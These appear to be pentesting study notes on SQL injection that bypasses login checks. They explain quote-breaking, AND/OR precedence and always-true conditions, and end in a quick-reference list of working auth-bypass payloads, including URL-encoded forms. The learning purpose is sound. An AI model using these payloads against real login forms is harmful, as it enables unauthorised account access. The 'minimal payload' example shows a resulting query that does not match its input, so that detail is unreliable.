# SQL Injection – Subverting Query Logic

## Purpose

Modify SQL query logic so authentication **always evaluates to TRUE**, allowing login without valid credentials.

Core technique:

- inject logical operators
- manipulate boolean evaluation
- use comments where needed
- force database to return at least one row

---

# Authentication Query Example

Typical login query:

```sql
SELECT * FROM logins 
WHERE username='admin' 
AND password='p@ssw0rd';
```

Application logic:

```
IF query returns row
	login successful
ELSE
	login failed
```

Both conditions must be TRUE:

```
username = valid user
AND
password = correct password
```

---

# Step 1 – Identify SQL Injection

We test whether input is processed as SQL.

## Test Characters

| Payload | URL Encoded |
|--------|-------------|
| ' | %27 |
| " | %22 |
| # | %23 |
| ; | %3B |
| ) | %29 |

Example test input:

```
'
```

Resulting query:

```sql
SELECT * FROM logins 
WHERE username=''' 
AND password='something';
```

This produces:

- syntax error
- SQL error message
- different page behaviour

This indicates the input is not properly sanitised.

---

# Step 2 – Understand Query Logic

Original logic:

```sql
username must exist
AND
password must match
```

Truth table:

| username valid | password valid | result |
|--------------|---------------|--------|
| TRUE | TRUE | TRUE |
| TRUE | FALSE | FALSE |
| FALSE | TRUE | FALSE |
| FALSE | FALSE | FALSE |

We need a condition that always evaluates to TRUE.

---

# Step 3 – Use OR Operator

The OR operator returns TRUE if either condition is TRUE.

Example always-true condition:

```sql
'1'='1'
```

This always evaluates as:

```
TRUE
```

---

# Basic OR Injection

Payload:

```
admin' or '1'='1
```

Resulting query:

```sql
SELECT * FROM logins 
WHERE username='admin' 
or '1'='1' 
AND password='something';
```

---

# Operator Precedence

SQL evaluates:

```
AND before OR
```

So the query becomes:

```sql
username='admin'
OR
(
 '1'='1'
 AND
 password='something'
)
```

Evaluate inner expression:

```
'1'='1' = TRUE
password='something' = FALSE

TRUE AND FALSE = FALSE
```

Final evaluation:

```
username='admin' OR FALSE
```

If admin exists → TRUE → login bypass.

---

# Successful Authentication Bypass

## Username field

```
admin' or '1'='1
```

## Password field

```
anything
```

Result:

✔ login successful without knowing password.

---

# Case – Unknown Username

If the username does not exist:

```
notAdmin' or '1'='1
```

Resulting query:

```sql
SELECT * FROM logins 
WHERE username='notAdmin' 
or '1'='1' 
AND password='something';
```

Evaluation:

```
username='notAdmin' = FALSE

TRUE AND FALSE = FALSE

FALSE OR FALSE = FALSE
```

Login fails.

---

# Injecting into Password Field

To guarantee TRUE result regardless of username:

Password payload:

```
something' or '1'='1
```

Resulting query:

```sql
SELECT * FROM logins 
WHERE username='notAdmin' 
AND password='something' 
or '1'='1';
```

Evaluation:

```
(FALSE AND FALSE) OR TRUE
```

Final result:

```
TRUE
```

Login successful.

---

# Minimal Injection Payload

Username:

```
'
```

Password:

```
' or '1'='1
```

Resulting query:

```sql
SELECT * FROM logins 
WHERE username='' 
AND password='' 
or '1'='1';
```

TRUE condition returns first row in table.

Often logs in as:

```
admin
```

because admin is first record.

---

# Visual Logic Flow

## Original

```sql
username='admin'
AND
password='password'
```

Both must be TRUE.

---

## Injected

```sql
(FALSE AND FALSE)
OR
TRUE
```

Always TRUE.

---

# Common OR Injection Payloads

```
' or '1'='1
```

```
admin' or '1'='1
```

```
' OR 1=1 --
```

```
" OR "1"="1
```

```
' OR TRUE --
```

---

# URL Encoded Versions

```
%27%20or%20%271%27=%271
```

```
%27%20OR%201=1--
```

---

# Example Query Comparison

## Normal Login Attempt

```sql
SELECT * FROM logins
WHERE username='admin'
AND password='wrongpass';
```

Result:

```
FALSE
```

---

## Injected Login Attempt

```sql
SELECT * FROM logins
WHERE username='admin'
OR '1'='1'
AND password='wrongpass';
```

Result:

```
TRUE
```

---

# Why This Works

Applications often assume:

user input = safe string

but SQL interprets input as:

executable query logic.

We are:

breaking out of string context
injecting logical condition
forcing TRUE result

---

# Key Takeaways

- OR operator can override authentication checks
- '1'='1 is commonly used always-true condition
- SQL evaluates AND before OR
- injecting into password field can bypass unknown usernames
- returning first row often logs in as admin
- minimal payload can bypass login entirely

---

# Quick Reference

## Basic test payload

```
'
```

## Always true condition

```
'1'='1
```

## Auth bypass payload

```
' or '1'='1
```

## Combined bypass

```
admin' or '1'='1
```

---

# Tags

#sql-injection  
#sqli  
#auth-bypass  
#boolean-logic  
#or-injection  
#web-security  
#pentesting  
#obsidian